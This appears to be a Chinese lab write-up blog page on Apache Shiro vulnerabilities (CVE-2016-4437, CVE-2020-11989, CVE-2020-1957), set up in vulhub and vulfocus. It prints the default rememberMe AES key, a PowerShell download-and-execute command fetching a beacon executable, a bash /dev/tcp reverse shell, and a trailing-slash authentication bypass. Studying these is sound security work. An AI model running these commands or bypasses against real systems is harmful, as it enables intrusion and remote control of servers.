@@ -1,0 +1,590 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Shiro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro总结">
+<meta property="og:url" content="http://example.com/2021/06/22/shiro/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Shiro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064238245.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064306711.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064357068.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064451479.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064605144.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064753752.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065236330.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065409681.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515070102340.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071107259.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071528001.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071942968.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072513728.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073534804.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073556410.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073621654.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073808383.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073851831.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073929807.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072628016.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072605647.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515155916974.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160136173.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160124862.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160406859.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160609251.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160645604.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162145988.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162348920.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162546262.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162636567.png">
+<meta property="og:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162718265.png">
+<meta property="article:published_time" content="2021-06-22T11:34:32.814Z">
+<meta property="article:modified_time" content="2021-06-22T11:34:10.718Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Shiro总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064238245.png"><title>Shiro总结 | Hexo</title><link ref="canonical" href="http://example.com/2021/06/22/shiro/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Shiro总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-06-22</span></span></div></header><div class="post-body"><p><strong>Shiro</strong></p>
+<span id="more"></span>
+
+
+        <h1 id="Shrio"   >
+          <a href="#Shrio" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shrio" class="headerlink" title="Shrio"></a>Shrio</h1>
+      
+        <h2 id="前言"   >
+          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
+      <p>维基百科：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Apache_Shiro" >https://zh.wikipedia.org/wiki/Apache_Shiro</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>Apache Shiro 是企业常见的Java安全框架，执行身份验证、授权、密码和会话管理</p>
+<p>只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞</p>
+
+        <h2 id="漏洞原理"   >
+          <a href="#漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2>
+      <p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、检索RememberMe cookie的值</span><br><span class="line">2、Base 64解码</span><br><span class="line">3、使用AES解密（加密密钥硬编码）</span><br><span class="line">4、进行反序列化操作（未作过滤处理）</span><br><span class="line">在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="shiro序列化利用条件"   >
+          <a href="#shiro序列化利用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#shiro序列化利用条件" class="headerlink" title="shiro序列化利用条件"></a>shiro序列化利用条件</h2>
+      <p>由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code>，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞</p>
+<p>尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。</p>
+
+        <h2 id="本地搭建"   >
+          <a href="#本地搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2>
+      
+        <h3 id="环境下载"   >
+          <a href="#环境下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Tomcat安装"   >
+          <a href="#Tomcat安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat安装" class="headerlink" title="Tomcat安装"></a>Tomcat安装</h3>
+      <p>同样是安装java8</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064238245.png" alt="image-20210515064238245"></p>
+<p>然后安装Tomcat8</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064306711.png" alt="image-20210515064306711"></p>
+
+        <h3 id="部署war包"   >
+          <a href="#部署war包" class="heading-link"><i class="fas fa-link"></i></a><a href="#部署war包" class="headerlink" title="部署war包"></a>部署war包</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064357068.png" alt="image-20210515064357068"></p>
+
+        <h3 id="启动Tomcat8并访问Shiro"   >
+          <a href="#启动Tomcat8并访问Shiro" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动Tomcat8并访问Shiro" class="headerlink" title="启动Tomcat8并访问Shiro"></a>启动Tomcat8并访问Shiro</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064451479.png" alt="image-20210515064451479"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064605144.png" alt="image-20210515064605144"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515064753752.png" alt="image-20210515064753752"></p>
+
+        <h2 id="Linux搭建"   >
+          <a href="#Linux搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h2>
+      <p>使用vulhub </p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/shiro/CVE-2016-4437</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065236330.png" alt="image-20210515065236330"></p>
+<p>远程访问一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515065409681.png" alt="image-20210515065409681"></p>
+
+        <h2 id="Linux出网环境渗透Shiro反序列化漏洞"   >
+          <a href="#Linux出网环境渗透Shiro反序列化漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux出网环境渗透Shiro反序列化漏洞" class="headerlink" title="Linux出网环境渗透Shiro反序列化漏洞"></a>Linux出网环境渗透Shiro反序列化漏洞</h2>
+      
+        <h3 id="Apache-Shiro-反序列化漏洞-CVE-2016-4437"   >
+          <a href="#Apache-Shiro-反序列化漏洞-CVE-2016-4437" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apache-Shiro-反序列化漏洞-CVE-2016-4437" class="headerlink" title="Apache Shiro 反序列化漏洞 (CVE-2016-4437)"></a>Apache Shiro 反序列化漏洞 (CVE-2016-4437)</h3>
+      
+        <h4 id="漏洞原理-1"   >
+          <a href="#漏洞原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4>
+      <p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p>
+<p>得到rememberMe的cookie值&gt;Base64解码一&gt;AES解密一&gt;反序列化。</p>
+<p>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞</p>
+
+        <h4 id="影响版本"   >
+          <a href="#影响版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4>
+      <p>Shiro&lt;1.2.5版本</p>
+
+        <h4 id="漏洞复现"   >
+          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4>
+      <p>进行抓包</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515070102340.png" alt="image-20210515070102340"></p>
+
+        <h2 id="Linux不出网环境渗透Shiro反序列化漏洞"   >
+          <a href="#Linux不出网环境渗透Shiro反序列化漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux不出网环境渗透Shiro反序列化漏洞" class="headerlink" title="Linux不出网环境渗透Shiro反序列化漏洞"></a>Linux不出网环境渗透Shiro反序列化漏洞</h2>
+      <p>执行一下py脚本</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071107259.png" alt="image-20210515071107259"></p>
+<p>分析一下这个脚本</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071528001.png" alt="image-20210515071528001"></p>
+<p>可以修改延迟 可以修改默认碰撞的key</p>
+<p>执行一下 看看效果</p>
+
+        <h3 id="Windows环境"   >
+          <a href="#Windows环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h3>
+      
+        <h4 id="拿到shell"   >
+          <a href="#拿到shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h4>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515071942968.png" alt="image-20210515071942968"></p>
+<p>跑出了加密密钥 + 系统</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072513728.png" alt="image-20210515072513728"></p>
+
+        <h4 id="上线CS"   >
+          <a href="#上线CS" class="heading-link"><i class="fas fa-link"></i></a><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4>
+      <p>熟练的操作一遍</p>
+<p>生成马儿</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073534804.png" alt="image-20210515073534804"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073556410.png" alt="image-20210515073556410"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073621654.png" alt="image-20210515073621654"></p>
+<p>python开启服务</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073808383.png" alt="image-20210515073808383"></p>
+<p>拿到的shell执行powershell一句话</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.175.130:8888/a001.exe&#x27;,&#x27;a001.exe&#x27;);start-process a001.exe</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073851831.png" alt="image-20210515073851831"></p>
+<p>成功上线</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515073929807.png" alt="image-20210515073929807"></p>
+<p>可以看到权限事System权限</p>
+
+        <h3 id="Linux环境"   >
+          <a href="#Linux环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h3>
+      
+        <h4 id="拿到shell-1"   >
+          <a href="#拿到shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#拿到shell-1" class="headerlink" title="拿到shell"></a>拿到shell</h4>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072628016.png" alt="image-20210515072628016"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515072605647.png" alt="image-20210515072605647"></p>
+
+        <h4 id="上线vps"   >
+          <a href="#上线vps" class="heading-link"><i class="fas fa-link"></i></a><a href="#上线vps" class="headerlink" title="上线vps"></a>上线vps</h4>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h2 id="内网环境打Shrio"   >
+          <a href="#内网环境打Shrio" class="heading-link"><i class="fas fa-link"></i></a><a href="#内网环境打Shrio" class="headerlink" title="内网环境打Shrio"></a>内网环境打Shrio</h2>
+      
+        <h2 id="自动化武器"   >
+          <a href="#自动化武器" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动化武器" class="headerlink" title="自动化武器"></a>自动化武器</h2>
+      
+        <h3 id="Shiro反序列化漏洞综合利用工具"   >
+          <a href="#Shiro反序列化漏洞综合利用工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro反序列化漏洞综合利用工具" class="headerlink" title="Shiro反序列化漏洞综合利用工具"></a>Shiro反序列化漏洞综合利用工具</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515155916974.png" alt="image-20210515155916974"></p>
+
+        <h3 id="自动加key回显工具"   >
+          <a href="#自动加key回显工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动加key回显工具" class="headerlink" title="自动加key回显工具"></a>自动加key回显工具</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160136173.png" alt="image-20210515160136173"></p>
+<p>把key复制过去</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160124862.png" alt="image-20210515160124862"></p>
+
+        <h3 id="命令执行工具-117个key"   >
+          <a href="#命令执行工具-117个key" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令执行工具-117个key" class="headerlink" title="命令执行工具-117个key"></a>命令执行工具-117个key</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160406859.png" alt="image-20210515160406859"></p>
+
+        <h3 id="Shiro550-720漏洞检测工具–Linux好用"   >
+          <a href="#Shiro550-720漏洞检测工具–Linux好用" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shiro550-720漏洞检测工具–Linux好用" class="headerlink" title="Shiro550_720漏洞检测工具–Linux好用"></a>Shiro550_720漏洞检测工具–Linux好用</h3>
+      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160609251.png" alt="image-20210515160609251"></p>
+<p>一般是选择这两个</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515160645604.png" alt="image-20210515160645604"></p>
+
+        <h2 id="Apache-shrio权限绕过-CVE-2020-11989"   >
+          <a href="#Apache-shrio权限绕过-CVE-2020-11989" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apache-shrio权限绕过-CVE-2020-11989" class="headerlink" title="Apache shrio权限绕过(CVE-2020-11989)"></a>Apache shrio权限绕过(CVE-2020-11989)</h2>
+      
+        <h3 id="漏洞原理-2"   >
+          <a href="#漏洞原理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3>
+      <p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。<br>Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon，authc等拦截器。</p>
+<p>anon为匿名拦截器，不需要登录即可访问；</p>
+<p>authc为登录拦截器，需要登录才可以访问。</p>
+<p>Shiro的URL路径表达式为Ant格式，路径通配符表示匹配零个或多个字符串，<code>/</code>可以匹配<code>/hello</code>，但是匹配不到<code>/hello/</code>，因为<code>*</code>通配符无法匹配路径。假设<code>/hello</code>接口设置了authc拦截器，访问<code>/hello</code>会进行权限判断，但如果访问的是<code>/hello/</code>，那么将无法正确匹配URL，直接放行，进入到spring拦截器。spring中的<code>/hello</code>和<code>/hello/</code>形式的URL访问的资源是一样的，从而实现了权限绕过。</p>
+
+        <h3 id="影响版本-1"   >
+          <a href="#影响版本-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3>
+      <p>Apache Shiro &lt;1.5.2版本</p>
+
+        <h3 id="漏洞复现-1"   >
+          <a href="#漏洞复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/shiro-cve_2020_1957 #拉取镜像</span><br><span class="line">docker images                            #查看开启的ID</span><br><span class="line">docker run -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.175.130 29136b1d3c61</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162145988.png" alt="image-20210515162145988"></p>
+<p>这里是Kali本机的IP</p>
+<p>成功访问</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162348920.png" alt="image-20210515162348920"></p>
+<p>进行抓包</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162546262.png" alt="image-20210515162546262"></p>
+<p>访问<code>/hello/1</code> 接口</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162636567.png" alt="image-20210515162636567"></p>
+<p>发生了302跳转</p>
+<p>那么在加一个<code>/</code></p>
+<p>成功绕过</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210515162718265.png" alt="image-20210515162718265"></p>
+
+        <h3 id="漏洞比较"   >
+          <a href="#漏洞比较" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞比较" class="headerlink" title="漏洞比较"></a>漏洞比较</h3>
+      <p>CVE-2020-13933虽然是CVE-2020-11989的绕过，然而两者的绕过内容却不同！</p>
+<p>CVE-2020-11989：针对于<code>/admin/page</code>，这种固定路由，shiro得到的地址为<code>/</code>，因此认为可以访问，Spring得到的地址为<code>/admin/page</code>，从而定位到未授权的页面！</p>
+<p>CVE-2020-13933则是匹配非固定地址路由，比如<code>/admin/&#123;name&#125;</code>，因为shiro得到的是<code>/admin/</code>，认为可以访问，而Spring得到的是<code>/admin/;page</code>，如果也采取固定路由，则会因为找不到<code>;page</code>，从而返回404！</p>
+
+        <h2 id="Apache-Shiro-认证绕过漏洞-CVE-2020-1957"   >
+          <a href="#Apache-Shiro-认证绕过漏洞-CVE-2020-1957" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apache-Shiro-认证绕过漏洞-CVE-2020-1957" class="headerlink" title="Apache Shiro 认证绕过漏洞(CVE-2020-1957)"></a>Apache Shiro 认证绕过漏洞(CVE-2020-1957)</h2>
+      
+        <h3 id="漏洞原理-3"   >
+          <a href="#漏洞原理-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3>
+      <p>在使用Spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转，可以绕过Shiro中对目录的权限限制。</p>
+
+        <h3 id="影响版本-2"   >
+          <a href="#影响版本-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3>
+      <p>Apache Shiro&lt;1.5.3</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">John Doe</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2021/06/22/shiro/">http://example.com/2021/06/22/shiro/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/Shiro%E6%80%BB%E7%BB%93/">Shiro总结</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/06/22/Spring/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Spring总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/06/22/Redis/"><span class="paginator-prev__text">Redis总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shrio"><span class="toc-number">1.</span> <span class="toc-text">
+          Shrio</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">
+          漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">
+          shiro序列化利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA"><span class="toc-number">1.4.</span> <span class="toc-text">
+          本地搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.4.1.</span> <span class="toc-text">
+          环境下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%AE%89%E8%A3%85"><span class="toc-number">1.4.2.</span> <span class="toc-text">
+          Tomcat安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2war%E5%8C%85"><span class="toc-number">1.4.3.</span> <span class="toc-text">
+          部署war包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8Tomcat8%E5%B9%B6%E8%AE%BF%E9%97%AEShiro"><span class="toc-number">1.4.4.</span> <span class="toc-text">
